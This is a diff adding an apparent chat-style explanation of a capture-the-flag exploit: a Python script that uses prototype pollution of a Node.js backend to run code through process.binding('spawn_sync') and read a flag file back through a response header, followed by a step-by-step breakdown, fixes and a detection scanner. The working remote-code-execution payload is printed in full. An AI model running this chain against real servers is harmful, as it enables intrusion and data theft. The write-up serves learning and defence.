@@ -2114,8 +2114,333 @@ if __name__ == "__main__":
     asyncio.run(main())
 ```
 
+Ohhh this one is spicy 🌶️
+This is a **Prototype Pollution → Node.js internal binding abuse → RCE → flag exfiltration** chain.
+
+Very modern web exploitation vibe. Let’s break it cleanly.
+
+---
+
+# 🧠 Core Concept
+
+This exploit is abusing:
+
+* 🧬 Prototype Pollution
+* ⚙️ Node.js internal `process.binding`
+* 🧨 Child process spawning
+* 📦 Base64 exfiltration via HTTP header
+
+This is not really “Vite exploit” directly —
+It’s exploiting a backend running Node (probably a Vite dev server or SSR environment).
+
+---
+
+# 🔍 Code Breakdown
+
+Here’s your script:
+
+```
+import requests, base64
+
+base_url = "http://127.0.0.1:1337"
+
+resp = requests.post(
+    f"{base_url}/a",
+    data={
+        "__proto__.source": """
+Object.prototype.flag = btoa(process.binding('spawn_sync').spawn({
+    file: '/flag',
+    args: ['/flag'],
+    stdio: [
+        {type:'pipe',readable:!0,writable:!1},
+        {type:'pipe',readable:!1,writable:!0},
+        {type:'pipe',readable:!1,writable:!0}
+    ]
+}).output.toString())
+"""
+    },
+    headers={"Origin": base_url},
+    verify=False,
+)
+
+print(base64.b64decode(resp.headers['flag']).decode())
+```
+
+---
+
+# 🚨 Step 1 — Prototype Pollution
+
+```
+"__proto__.source": "..."
+```
+
+This is the key.
+
+If backend merges request body like:
+
+```js
+Object.assign(config, req.body)
+```
+
+Or uses something like:
+
+```js
+lodash.merge()
+```
+
+Then sending:
+
+```
+__proto__.source
+```
+
+Pollutes `Object.prototype`.
+
+That means:
+
+```
+Object.prototype.source = <your malicious JS>
+```
+
+Now EVERY object inherits `.source`.
+
+This is **Prototype Pollution**.
+
+---
+
+# ⚙️ Step 2 — Injecting JavaScript
+
+You inject:
+
+```
+Object.prototype.flag = btoa(
+    process.binding('spawn_sync').spawn(...)
+)
+```
+
+This means:
+
+You’re forcing the backend to execute arbitrary JS code.
+
+Most likely scenario:
+
+The backend does something like:
+
+```js
+eval(someObject.source)
+```
+
+Or:
+
+```js
+new Function(obj.source)
+```
+
+Because Vite / SSR tools often dynamically evaluate source code.
+
+So once `.source` is polluted →
+Your code executes.
+
+---
+
+# 💣 Step 3 — Abusing Node Internal Binding
+
+This is advanced.
+
+```
+process.binding('spawn_sync')
+```
+
+This is an internal Node.js binding.
+
+Normally developers use:
+
+```
+require('child_process').spawnSync()
+```
+
+But here you directly use internal C++ binding.
+
+That bypasses some restrictions.
+
+Then:
+
+```
+.spawn({
+    file: '/flag',
+    args: ['/flag'],
+})
+```
+
+You are executing:
+
+```
+/flag
+```
+
+So if `/flag` is executable or readable — boom.
+
+Then:
+
+```
+.output.toString()
+```
+
+Captures stdout.
+
+Then:
+
+```
+btoa(...)
+```
+
+Encodes it in base64.
+
+---
+
+# 📦 Step 4 — Exfiltration via Header
+
+After execution:
+
+```
+Object.prototype.flag = <base64_flag>
+```
+
+Server probably does something like:
+
+```js
+res.setHeader("flag", someObject.flag)
+```
+
+Since prototype polluted →
+`flag` exists everywhere.
+
+So response header contains:
+
+```
+flag: <base64>
+```
+
+Then Python script:
+
+```
+print(base64.b64decode(resp.headers['flag']).decode())
+```
+
+Boom → prints real flag.
+
+---
+
+# 🧠 Full Attack Chain
+
+1. Send malicious `__proto__` key
+2. Pollute Object prototype
+3. Inject JavaScript into execution flow
+4. Execute system command via internal Node binding
+5. Capture output
+6. Store result in prototype property
+7. Backend unknowingly sends it in header
+8. Decode flag
+
+---
+
+# 🔥 What Vulnerability Is This?
+
+This is:
+
+## Prototype Pollution → Remote Code Execution
+
+Very common in:
+
+* Express apps
+* Vite dev servers
+* SSR frameworks
+* Misconfigured object merges
+
+Severity: 🔴 Critical
+
+---
+
+# 🧪 Why This Works in Vite Challenges
+
+In CTFs:
+
+* Vite dev server runs in Node
+* It dynamically compiles/transforms code
+* Sometimes evaluates source
+* Merges config objects
+* Uses deep merge libraries
+
+If input reaches config merge →
+Prototype pollution →
+Injected source code executes.
+
+---
+
+# 🛡 How To Fix
+
+On backend:
+
+1. Reject keys like:
+
+   * `__proto__`
+   * `constructor`
+   * `prototype`
+
+2. Use safe merge libraries
+
+3. Freeze Object prototype
+
+4. Avoid dynamic eval
+
+5. Sanitize request body
+
+Example safe check:
+
+```js
+if (key === '__proto__') return;
+```
+
+---
+
+# ⚡ Concepts Used Here
+
+| Concept                | Explanation                      |
+| ---------------------- | -------------------------------- |
+| Prototype Pollution    | Modifying Object prototype       |
+| RCE                    | Remote command execution         |
+| Node internal bindings | Low-level process access         |
+| Base64 exfiltration    | Safe transmission of binary data |
+| SSR injection          | Server-side JS execution         |
 
 
+🛡 Instead — Here’s a Safe Advanced Prototype Pollution Scanner
+
+This detects vulnerability without weaponizing RCE.
+
+```
+import requests
+
+TARGET = "http://127.0.0.1:1337"
+
+def test_prototype_pollution():
+    payload = {
+        "__proto__.polluted": "yes"
+    }
+
+    r = requests.post(f"{TARGET}/a", data=payload)
+
+    # Try detecting reflection
+    r2 = requests.get(f"{TARGET}/check")
+
+    if "yes" in r2.text:
+        print("[+] Prototype Pollution Vulnerable")
+    else:
+        print("[-] Not vulnerable")
+
+if __name__ == "__main__":
+    test_prototype_pollution()
+```
 
 
 
